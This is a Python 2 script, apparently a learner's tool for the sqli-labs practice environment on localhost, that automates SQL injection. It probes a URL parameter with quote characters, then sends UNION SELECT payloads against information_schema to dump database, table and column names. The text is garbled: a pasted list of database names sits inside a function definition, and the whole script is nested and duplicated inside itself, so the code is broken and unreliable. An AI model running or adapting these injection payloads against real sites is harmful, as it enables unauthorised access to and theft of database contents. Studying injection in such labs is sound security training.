#coding=UTF-8
import re
import requests
from bs4 import BeautifulSoup
import sys
reload(sys)
sys.setdefaultencoding('utf8')

def getHTMLText(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        r.encoding = r.apparent_encoding
        return r.text
    except:
        print("getHTMLText error")
    return "getHTMLText right"

#捕捉返回的错误，判断注入点
def sqlloc_error(html,url,lists):
    try:
        error = re.search(r'syntax',html)
        if error:
            #print(url + " is the payload")
            lists.append(url)
    except:
        return "rightback error"

#构造注入点的url
def testsql(start_url,lists):
    injects = ['\'' , '\"' ,')', '\')', '\")']
    for inject in injects:
        url = start_url + inject
        html = getHTMLText(url)
        sqlloc_error(html,url,lists)


#捕捉爆库返回的字段
def sqlrep_back(html,payload_reps):information_schema
challenges
mysql
performance_schema
security
slc
test
    try:
        soup = BeautifulSoup(html,"html.parser")
        Rep = soup.select("font > font")
        NRep = Rep[0].text
        NNRep = NRep.split(':')[2]
        num = len(NNRep.split(','))
        for i in range(num):
            payload_reps.append(NNRep.split(',')[i])
            print(payload_reps[i])
#coding=UTF-8
import re
import requests
from bs4 import BeautifulSoup
import sys
reload(sys)
sys.setdefaultencoding('utf8')

def getHTMLText(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        r.encoding = r.apparent_encoding
        return r.text
    except:
        print("getHTMLText error")
    return "getHTMLText right"

#捕捉返回的错误，判断注入点
def sqlloc_error(html,url,lists):
    try:
        error = re.search(r'syntax',html)
        if error:
            #print(url + " is the payload")
            lists.append(url)
    except:
        return "rightback error"

#构造注入点的url
def testsql(start_url,lists):
    injects = ['\'' , '\"' ,')', '\')', '\")']
    for inject in injects:
        url = start_url + inject
        html = getHTMLText(url)
        sqlloc_error(html,url,lists)


#捕捉爆库返回的字段
def sqlrep_back(html,payload_reps):
    try:
        soup = BeautifulSoup(html,"html.parser")
        Rep = soup.select("font > font")
        NRep = Rep[0].text
        NNRep = NRep.split(':')[2]
        num = len(NNRep.split(','))
        for i in range(num):
            payload_reps.append(NNRep.split(',')[i])
            print(payload_reps[i])

    except:
        return "sqlrep_back error"


#爆库(这里还没有实现自动判断字段数，payload机制还待完善，可以实现一个批量payload))
def BoomRepository(list,payload_reps):
    newurl = list + " union select 1,2,group_concat(schema_name) from information_schema.schemata --+"
    html = getHTMLText(newurl)
    sqlrep_back(html,payload_reps)

#捕捉爆出的表
def sqltab_back(html,payload_tables):
    try:
        soup = BeautifulSoup(html,'html.parser')
        Tab = soup.select("font > font")
        NTab = Tab[0].text
        NNTab = NTab.split(':')[2]
        num = len(NNTab.split(','))
        for i in range(num):
            payload_tables.append(NNTab.split(',')[i])
            print(payload_tables[i])
    except:
        print("sqltab_back error")


#爆表
def BoomTable(list,payload_columns,payload_tables,payload_reps):
    for payload_rep in payload_reps:
        newurl = list + " union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='" + payload_rep + "' --+"
        print("-----------正在爆" + payload_rep + "库的表-----------")
        html = getHTMLText(newurl)
        sqltab_back(html,payload_tables)
        for payload_table in payload_tables:
            print("-------------------------正在爆" + payload_rep +"库的" + payload_table + "表的字段-------------------------")
            Boomcolumn(list, payload_tables,payload_columns)


#捕捉爆出的字段
def sqlcol_back(html,payload_columns):
    try:
        soup = BeautifulSoup(html,'html.parser')
        Col = soup.select("font > font")
        NCol = Col[0].text
        NNCol = NCol.split(':')[2]
        num = len(NNCol.split(','))
        for i in range(num):
            payload_columns.append(NNCol.split(',')[i])
            print(payload_columns[i])
    except:
        print("sqlcol_back error")
#爆字段
def Boomcolumn(list, payload_tables,payload_columns):
    for payload_table in payload_tables:
        newurl = list + " union select 1,2,group_concat(column_name) from information_schema.columns where table_name='" + payload_table + "' --+"
        html = getHTMLText(newurl)
        sqlcol_back(html, payload_columns)

def main():
    lists = []  #判断是否有注入点的url
    payload_reps = [] #爆出来的库的列表
    payload_tables = [] #爆出来的表的列表、
    payload_columns = [] #爆出来的字段
    start_url = 'http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'
    testsql(start_url,lists)
    print("-----------------------正在爆库--------------------------")
    BoomRepository(lists[0], payload_reps)
    print("------------------------正在爆表--------------------------")
    BoomTable(lists[0], payload_columns, payload_tables, payload_reps)

main()
    except:
        return "sqlrep_back error"


#爆库(这里还没有实现自动判断字段数)
def BoomRepository(list,payload_reps):
    newurl = list + " union select 1,2,group_concat(schema_name) from information_schema.schemata --+"
    html = getHTMLText(newurl)
    sqlrep_back(html,payload_reps)

#捕捉爆出的表
def sqltab_back(html,payload_tables):
    try:
        soup = BeautifulSoup(html,'html.parser')
        Tab = soup.select("font > font")
        NTab = Tab[0].text
        NNTab = NTab.split(':')[2]
        num = len(NNTab.split(','))
        for i in range(num):
            payload_tables.append(NNTab.split(',')[i])
            print(payload_tables[i])
    except:
        print("sqltab_back error")


#爆表
def BoomTable(list,payload_columns,payload_tables,payload_reps):
    for payload_rep in payload_reps:
        newurl = list + " union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='" + payload_rep + "' --+"
        print("-----------正在爆" + payload_rep + "库的表-----------")
        html = getHTMLText(newurl)
        sqltab_back(html,payload_tables)
        for payload_table in payload_tables:
            print("-------------------------正在爆" + payload_rep +"库的" + payload_table + "表的字段-------------------------")
            Boomcolumn(list, payload_tables,payload_columns)


#捕捉爆出的字段
def sqlcol_back(html,payload_columns):
    try:
        soup = BeautifulSoup(html,'html.parser')
        Col = soup.select("font > font")
        NCol = Col[0].text
        NNCol = NCol.split(':')[2]
        num = len(NNCol.split(','))
        for i in range(num):
            payload_columns.append(NNCol.split(',')[i])
            print(payload_columns[i])
    except:
        print("sqlcol_back error")
#爆字段
def Boomcolumn(list, payload_tables,payload_columns):
    for payload_table in payload_tables:
        newurl = list + " union select 1,2,group_concat(column_name) from information_schema.columns where table_name='" + payload_table + "' --+"
        html = getHTMLText(newurl)
        sqlcol_back(html, payload_columns)

def main():
    lists = []  #判断是否有注入点的url
    payload_reps = [] #爆出来的库的列表
    payload_tables = [] #爆出来的表的列表、
    payload_columns = [] #爆出来的字段
    start_url = 'http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'
    testsql(start_url,lists)
    print("-----------------------正在爆库--------------------------")
    BoomRepository(lists[0], payload_reps)
    print("------------------------正在爆表--------------------------")
    BoomTable(lists[0], payload_columns, payload_tables, payload_reps)

main()
